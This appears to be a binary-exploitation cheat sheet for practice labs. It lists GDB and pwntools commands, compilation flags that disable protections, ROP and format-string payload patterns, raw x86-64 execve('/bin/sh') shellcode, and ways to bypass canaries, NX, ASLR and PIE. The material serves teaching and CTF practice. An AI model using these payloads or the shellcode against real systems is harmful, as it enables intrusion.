# Binary Exploitation Command Reference

## Quick Setup Commands

```bash
# Disable ASLR (for practice)
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# Re-enable ASLR
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space

# Compile vulnerable program
gcc -fno-stack-protector -z execstack -no-pie vuln.c -o vuln

# Check protections
checksec vuln
```

## GDB Quick Reference

```bash
# Start GDB
gdb ./binary

# With arguments
gdb --args ./binary arg1 arg2

# Common commands
break main              # Breakpoint at main
break *0x401234         # Breakpoint at address
run                     # Start program
run < input.txt         # Run with input file
continue                # Continue execution
next                    # Next line (step over)
step                    # Step into function
nexti                   # Next instruction
stepi                   # Step one instruction

# Examine memory
x/20x $rsp              # 20 hex words at RSP
x/20x $rbp-64           # Memory at RBP-64
x/gx 0x401234           # Quad word at address
x/s 0x402000            # String at address
x/i $rip                # Instruction at RIP
x/10i main              # 10 instructions from main

# Registers
info registers          # All registers
print $rax              # RAX value
print/x $rsp            # RSP in hex
set $rax = 0x1234       # Set RAX

# Disassembly
disassemble main        # Disassemble function
disassemble 0x401234    # Disassemble address

# Stack
backtrace               # Call stack
frame 0                 # Select frame
info frame              # Frame details

# Pattern generation (pwndbg)
cyclic 200              # Generate 200-byte pattern
cyclic -l 0x61616162    # Find offset of pattern

# Memory mappings
vmmap                   # Show memory layout (pwndbg)
info proc mappings      # Memory regions

# Search
search "string"         # Find string
search -t qword 0x1234  # Find value

# Other
checksec                # Security features (pwndbg)
telescope $rsp 20       # Pretty print 20 stack entries
```

## Pwntools Python Template

```python
#!/usr/bin/env python3
from pwn import *

# Configuration
binary = './vuln'
elf = ELF(binary)
context.arch = 'amd64'
context.log_level = 'debug'  # or 'info', 'warning', 'error'

# Find addresses
win_addr = elf.symbols['win']
main_addr = elf.symbols['main']
got_printf = elf.got['printf']
plt_printf = elf.plt['printf']

# Find strings
binsh = next(elf.search(b'/bin/sh'))

# ROP
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

# Calculate offset (use cyclic in GDB)
offset = 72

# Build payload
payload = b'A' * offset
payload += p64(win_addr)

# Connect (choose one)
p = process(binary)
# p = remote('target.com', 1337)
# p = gdb.debug(binary, gdbscript='break main')

# Interact
p.sendline(payload)
p.interactive()
```

## ROPgadget Commands

```bash
# Find all gadgets
ROPgadget --binary ./binary

# Find specific gadgets
ROPgadget --binary ./binary --only "pop|ret"
ROPgadget --binary ./binary --only "mov|ret"
ROPgadget --binary ./binary --string "/bin/sh"

# Filter by gadgets
ROPgadget --binary ./binary | grep "pop rdi"
ROPgadget --binary ./binary | grep "syscall"

# Using ropper
ropper --file ./binary
ropper --file ./binary --search "pop rdi"
ropper --file ./binary --chain "execve"
```

## Compilation Flags

```bash
# Vulnerable (no protections)
gcc -fno-stack-protector -z execstack -no-pie vuln.c -o vuln

# With NX (no stack execution)
gcc -fno-stack-protector -no-pie vuln.c -o vuln

# With stack canary
gcc -z execstack -no-pie vuln.c -o vuln

# With PIE
gcc -fno-stack-protector -z execstack vuln.c -o vuln

# Full protection
gcc -fstack-protector-all -D_FORTIFY_SOURCE=2 -pie -fPIE vuln.c -o vuln

# 32-bit
gcc -m32 -fno-stack-protector -z execstack -no-pie vuln.c -o vuln
```

## Exploit Patterns

### Pattern 1: Simple ret2win
```python
payload = b'A' * offset + p64(win_addr)
```

### Pattern 2: ROP to system()
```python
payload = b'A' * offset
payload += p64(pop_rdi_ret)
payload += p64(binsh_addr)
payload += p64(system_plt)
```

### Pattern 3: ROP to execve syscall
```python
payload = b'A' * offset
payload += p64(pop_rax) + p64(59)      # execve
payload += p64(pop_rdi) + p64(binsh)   # filename
payload += p64(pop_rsi) + p64(0)       # argv
payload += p64(pop_rdx) + p64(0)       # envp
payload += p64(syscall_ret)
```

### Pattern 4: Format string read
```python
# Read stack
payload = b"%p " * 10

# Read address
payload = p64(target_addr) + b"%7$s"
```

### Pattern 5: Format string write
```python
# Write to address
payload = p64(target_addr)
payload += b"%100x"  # Print 100 chars
payload += b"%7$n"   # Write 100 to target_addr
```

## objdump Commands

```bash
# Disassemble all
objdump -d binary

# Disassemble specific function
objdump -d binary | grep -A 20 "<main>:"

# Show symbols
objdump -t binary

# Show strings
strings binary
strings -n 8 binary  # Min length 8

# Show sections
objdump -h binary

# Show relocations
objdump -R binary
```

## One-Liners

```bash
# Generate pattern
python3 -c "from pwn import *; print(cyclic(200))"

# Pack address
python3 -c "from pwn import *; import sys; sys.stdout.buffer.write(b'A'*72 + p64(0x401234))"

# Find ELF functions
readelf -s binary | grep FUNC

# Find strings
strings binary | grep -i password

# Check for RELRO
readelf -d binary | grep BIND_NOW

# Check NX
readelf -l binary | grep GNU_STACK

# Get base address in GDB
info proc mappings | grep binary
```

## Common Syscall Numbers (x86-64)

```
0   - read
1   - write
2   - open
3   - close
59  - execve
60  - exit
```

## Register Quick Reference

```
Arguments (x86-64 Linux):
RDI - 1st arg
RSI - 2nd arg
RDX - 3rd arg
RCX - 4th arg
R8  - 5th arg
R9  - 6th arg

Return:
RAX - return value

Callee-saved (must preserve):
RBX, RBP, R12-R15

Stack:
RSP - stack pointer
RBP - base pointer
```

## Shellcode Templates

### Linux x86-64 execve("/bin/sh")
```python
shellcode = b"\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe6\x48\x31\xd2\xb0\x3b\x0f\x05"
```

### With pwntools
```python
from pwn import *
context.arch = 'amd64'
shellcode = asm(shellcraft.sh())
```

## Protection Bypasses

```
Canary:
- Leak canary with format string or overflow
- Overwrite canary with leaked value
- Fork-based bruteforce (byte-by-byte)

NX:
- ROP chains
- ret2libc
- ret2syscall

ASLR:
- Leak addresses (format string, buffer over-read)
- Partial overwrite (last 12 bits not randomized)
- Bruteforce (32-bit)

PIE:
- Leak code address
- Relative offsets stay same
```
